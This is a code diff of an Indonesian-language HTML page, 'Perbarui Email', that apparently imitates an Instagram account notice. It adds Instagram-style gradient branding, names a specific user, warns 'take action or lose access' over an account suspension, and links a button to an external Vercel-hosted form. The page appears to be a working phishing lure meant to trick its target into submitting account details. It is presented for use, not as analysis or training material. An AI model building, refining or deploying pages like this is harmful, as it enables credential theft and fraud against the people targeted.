@@ -1,51 +1,112 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Perbarui Email</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #fff;
-      text-align: center;
       margin: 0;
       padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: white;
+      color: #262626;
+      display: flex;
+      justify-content: center;
     }
-    .container {
-      padding: 40px 20px;
+    .wrapper {
+      background: white;
+      border-radius: 12px;
+      padding: 24px 16px;
+      width: 100%;
+      max-width: 390px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      text-align: center;
     }
-    img {
-      max-width: 100%;
+    .top-row {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+    .logo-img,
+    .mid-img,
+    .gog-img,
+    .footer-img {
+      display: block;
+      margin: 0 auto;
+    }
+    .logo-img {
+      width: 160px;
       height: auto;
       border-radius: 16px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
     }
-    .button {
-      margin-top: 30px;
+    .mid-img {
+      width: 80px;
+      height: auto;
+    }
+    .logo {
+      font-weight: 600;
+      font-size: 1.15rem;
+      margin-bottom: 6px;
+      line-height: 1.4;
+      white-space: pre-line;
+    }
+    .subtitle {
+      font-size: 1.05rem;
+      margin: 2px 0 18px;
+      line-height: 1.6;
+      color: #262626;
+    }
+    .gog-img {
+      width: 180px;
+      height: auto;
+      margin: 10px auto 16px;
+      border-radius: 8px;
+    }
+    .button-link {
       display: inline-block;
-      background-color: #7F00FF;
+      background: linear-gradient(135deg, #833AB4, #FD1D1D, #FCAF45);
       color: white;
-      font-size: 18px;
-      padding: 15px 30px;
-      border-radius: 30px;
+      font-weight: bold;
+      font-size: 1rem;
+      padding: 12px 24px;
+      border-radius: 8px;
       text-decoration: none;
-      transition: 0.3s;
+      transition: 0.3s ease;
     }
-    .button:hover {
-      background-color: #00FFFF;
-      color: black;
+    .button-link:hover {
+      opacity: 0.9;
+    }
+    .footer-img {
+      margin-top: 18px;
+      width: 80px;
+      height: auto;
+      border-radius: 10px;
+      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://i.imgur.com/ClpB5g4.png" alt="Vanta Emblem"/>
-    <div>
-      <a href="https://html-form-host-icjqfopmp-kryptikastros-projects.vercel.app" class="button">
-        Perbarui Email
-      </a>
+  <div class="wrapper">
+    <div class="top-row">
+      <img src="https://i.imgur.com/ClpB5g4.png" alt="Logo" class="logo-img" />
+      <img src="https://i.imgur.com/Wk889yo.png" alt="Mid Icon" class="mid-img" />
     </div>
+    <div class="logo">Ambil tindakan atau kehilangan akses</div>
+    <div class="subtitle">
+      Halo la_ismyname,<br>
+      tambahkan email baru ke akun Anda<br>
+      untuk menerima pembaruan tentang<br>
+      status penangguhan akun
+    </div>
+    <img src="https://i.imgur.com/UZIsS5h.png" alt="Section Separator" class="gog-img" />
+    <a href="https://html-form-host.vercel.app" class="button-link">Perbarui Email</a>
+    <img src="https://i.imgur.com/z4qpO3r.png" alt="Footer Image" class="footer-img" />
   </div>
 </body>
 </html>
